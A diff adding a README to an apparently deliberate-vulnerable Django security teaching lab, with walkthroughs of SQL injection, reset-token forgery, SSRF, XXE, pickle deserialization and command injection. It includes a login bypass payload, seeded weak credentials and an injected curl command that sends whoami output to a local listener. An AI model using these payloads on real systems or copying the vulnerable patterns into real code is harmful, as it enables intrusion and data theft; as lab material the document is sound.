@@ -1,5 +1,136 @@
 # Django Security Lab
 
+This repository contains a deliberately vulnerable Django application used for teaching and testing common web vulnerabilities. It is intended to be run in a safe, isolated environment only.
+
+WARNING: Do not run this project on any network-exposed machine or against systems you do not control.
+
+## Quick start
+
+- Create and activate a Python virtualenv, then install requirements:
+
+```powershell
+& .venv\Scripts\Activate.ps1
+python -m pip install -r requirements.txt
+```
+
+- Apply migrations and seed users:
+
+```powershell
+& .venv\Scripts\python.exe manage.py migrate --noinput
+& .venv\Scripts\python.exe tools/seed_users.py
+```
+
+- Start the Django dev server:
+
+```powershell
+& .venv\Scripts\python.exe manage.py runserver
+```
+
+- Start the listener (in another terminal) for SSRF/XXE/command exfiltration tests:
+
+```powershell
+cd listener
+# ensure flask is installed in the venv
+& ..\.venv\Scripts\python.exe -m pip install flask
+$env:LISTENER_PORT='8081'
+& ..\.venv\Scripts\python.exe listener.py
+```
+
+## Seeded accounts
+
+- `admin` / `adminpass` (superuser)
+- `alice` / `alicepass`
+- `bob` / `bobpass`
+
+## Test scripts
+
+- `tools/test_admin_login.py`: programmatically logs into the Django admin.
+- `tools/test_vulns.py`: logs in (admin) and demonstrates several vulnerabilities:
+	- SSRF (`/dashboard/url-preview/`) — fetches arbitrary URLs via the server
+	- XXE / XML import (`/dashboard/xml-import/`) — imports customer XML
+	- Insecure deserialization (`/dashboard/deserialize/`) — base64-encoded pickle is deserialized
+
+Run the tests with:
+
+```powershell
+& .venv\Scripts\python.exe tools/test_vulns.py
+```
+
+The test script will exercise the endpoints and print snippets of responses. If you started the `listener` on port 8081 the SSRF exfiltration test will target `http://127.0.0.1:8081/?ssrf=test` and you should see the request printed by the listener.
+
+## Vulnerabilities and step-by-step demonstrations
+
+Each section below explains the vulnerability, why it is dangerous, and how the included tests demonstrate it. The content is intentionally educational — use it to understand and defend against real-world issues.
+
+### 1) SQL Injection (accounts/login)
+
+- Where: `accounts.views.login_view` — raw f-string interpolation into SQL.
+- Why dangerous: An attacker can inject SQL to bypass authentication or extract data.
+- Demonstration (manual):
+	1. Visit `/accounts/login/`.
+	2. Submit username: `admin'--` and any password — the raw SQL comment terminator bypasses the password check and logs in as the matching user.
+	3. Observe you are redirected to `/dashboard/`.
+
+- Demonstration (automated): `tools/test_vulns.py` logs in via the admin account and also keeps the vulnerable login view functional for manual exercises.
+
+### 2) Username enumeration (accounts/login, password reset)
+
+- Where: `accounts.views.login_view` and `password_reset_view` — different messages when a username exists vs not.
+- Why dangerous: Allows attackers to validate whether a username/email exists and focus targeted attacks.
+- How to test:
+	1. Try resetting password for `alice` vs `noone` at `/accounts/reset/` — observe the differing messages.
+
+### 3) Insecure password reset token
+
+- Where: `accounts.password_reset_view` — uses base64(username) as token.
+- Why dangerous: Trivially forgeable; attacker can generate valid reset links for any known username.
+- How to test:
+	1. Base64-encode `alice` (e.g. `echo -n alice | base64`) to get token.
+	2. Visit `/accounts/reset/<token>/` and set a new password.
+
+### 4) SSRF (dashboard/url-preview)
+
+- Where: `dashboard.url_preview` — server fetches any URL without allowlist.
+- Why dangerous: Server can access internal services (metadata endpoints, internal APIs) or exfiltrate data to attacker-controlled listeners.
+- Demonstration (automated): ensure `listener` is running on `127.0.0.1:8081`, then run `tools/test_vulns.py`. The SSRF exfiltration step posts the listener URL and the server fetches it; the listener will print the incoming request.
+
+### 5) Command injection (dashboard/ping)
+
+- Where: `dashboard.ping_host` — builds a shell command with user input and runs with `shell=True`.
+- Why dangerous: An attacker can append `; <cmd>` to run arbitrary commands on the host.
+- How to test (manual, lab-only):
+	1. Start listener.
+	2. Submit `127.0.0.1; curl http://127.0.0.1:8081/?d=$(whoami)` as host in the ping form (note: this will execute only in the lab). Observe listener output.
+
+### 6) XXE / XML import (dashboard/xml-import)
+
+- Where: `dashboard.xml_import` — uses `xml.etree.ElementTree.fromstring()` and imports data from uploaded XML.
+- Why dangerous: If external entities are processed, an attacker can read files or trigger HTTP callbacks to attacker-controlled endpoints.
+- Demonstration (automated): `tools/test_vulns.py` uploads a simple customer XML and the endpoint imports it into the `Customer` model. To practice XXE, craft an XML with an external entity pointing at the listener (lab only).
+
+### 7) Insecure deserialization (dashboard/deserialize)
+
+- Where: `dashboard.deserialize_session` — `pickle.loads` on user-supplied data.
+- Why dangerous: Pickle can execute arbitrary code during deserialization, offering remote code execution.
+- Demonstration (automated): `tools/test_vulns.py` posts a safe pickle object (a dict) to show the flow. To experiment with payloads, create a controlled malicious pickle in an isolated environment and observe the effect locally (do not run malicious pickles on production or networked hosts).
+
+## Teaching notes / defense strategies
+
+- For each vulnerability, discuss mitigations after practicing the exploit: parameterized queries / ORM use (SQLi), consistent error messages and rate-limiting (enumeration), secure token generation and expiry (password reset), allowlists and private-IP blocking (SSRF), avoid shell=True or sanitize inputs (command injection), use safe XML parsers or defusedxml (XXE), and avoid pickle/untrusted deserialization (use JSON or signed formats).
+
+Use the test scripts to reproduce vulnerable behavior, then modify the corresponding view to implement defenses and re-run tests to verify mitigation.
+
+## Files of interest
+
+- `accounts/views.py`, `dashboard/views.py` — main vulnerable code and in-code guidance.
+- `tools/test_vulns.py` — automated demonstrations used to build the README walkthrough.
+- `listener/listener.py` — helper HTTP listener for exfiltration tests.
+
+---
+This README is part of the lab materials. Use responsibly and only in safe environments.
+
+# Django Security Lab
+
 A deliberately vulnerable Django application for learning web security concepts in a **controlled, local environment**.
 
 > ⚠️ **WARNING: This application is intentionally insecure. Never deploy it on a public server or expose it to the internet.**
